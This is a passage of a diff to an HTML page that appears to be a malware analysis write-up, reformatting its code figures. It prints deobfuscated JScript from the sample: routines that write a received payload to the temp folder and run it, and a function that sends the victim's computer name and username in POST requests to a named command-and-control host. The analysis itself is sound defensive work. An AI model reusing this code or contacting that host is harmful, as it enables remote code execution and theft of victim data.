+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;%f&#39;</span>, <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;%n&#39;</span>, <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptName</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;%sfdr&#39;</span>, <span style="color:#a6e22e">vdr</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;%RgNe%&#39;</span>, <span style="color:#a6e22e">regi</span>);
+</span></span><span style="display:flex;"><span>			eval(<span style="color:#a6e22e">s2</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">Quit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;RF&#39;</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;temp&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fi</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">CreateTextFile</span>(<span style="color:#a6e22e">s2</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fi</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fi</span>.<span style="color:#a6e22e">Close</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">s2</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span></code></pre></div><p><em>Figure 9: Deobfuscated C2 commands</em></p>
 <p>Moving down, I arrived at the C2 domain that was previously located through the base64 decoding exercise. Here, we can see all of the additional informaiton that is sent via the post requests to the C2. Key points:</p>
 <ul>
 <li>C2 domain has the <code>/vre</code> directory appended to it as per Figure 9</li>
 <li>We can determine the syntax of the data sent to the C2 from the infromation provided below</li>
 </ul>
-<pre tabindex="0"><code>function Pt(C, A) {
-	var X = Cr(3);
-	X.open(&#39;POST&#39;, &#39;http://javaautorun.duia.ro:5465/&#39; + path, false);
-	X.SetRequestHeader(&#39;User-Agent:&#39;, nf());
-	X.send(A);
-	return X.responsetext;
-}
-function nf() {
-	var victim_info, NT, i;
-	if (fs.fileexists(Ex(&#39;Windir&#39;) + &#39;\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe&#39;)) {
-		NT = &#39;YES&#39;;
-	} else {
-		NT = &#39;NO&#39;;
-	}
-	victim_info = campaign + blackslash + Ex(&#39;COMPUTERNAME&#39;) + blackslash + Ex(&#39;USERNAME&#39;) + blackslash + Ob(2) + blackslash + Ob(4) + blackslash + blackslash + NT + blackslash + reg_key_exits + blackslash;
-	return victim_info;
-</code></pre><p><em>Figure 10: C2 Domain and POST data syntax</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Pt</span>(<span style="color:#a6e22e">C</span>, <span style="color:#a6e22e">A</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">X</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Cr</span>(<span style="color:#ae81ff">3</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">X</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;http://javaautorun.duia.ro:5465/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">path</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">X</span>.<span style="color:#a6e22e">SetRequestHeader</span>(<span style="color:#e6db74">&#39;User-Agent:&#39;</span>, <span style="color:#a6e22e">nf</span>());
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">X</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">A</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">X</span>.<span style="color:#a6e22e">responsetext</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">nf</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">victim_info</span>, <span style="color:#a6e22e">NT</span>, <span style="color:#a6e22e">i</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">fileexists</span>(<span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;Windir&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe&#39;</span>)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">NT</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;YES&#39;</span>;
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">NT</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;NO&#39;</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">victim_info</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">campaign</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;COMPUTERNAME&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;USERNAME&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ob</span>(<span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ob</span>(<span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">NT</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">reg_key_exits</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">victim_info</span>;
+</span></span></code></pre></div><p><em>Figure 10: C2 Domain and POST data syntax</em></p>
 <p>The User-Agent string is used to supply the C2 domain with information recovered from the victim machine</p>
 <pre tabindex="0"><code>POST /Vre HTTP/1.1
 Host: javaautorun.duia.ro:5465
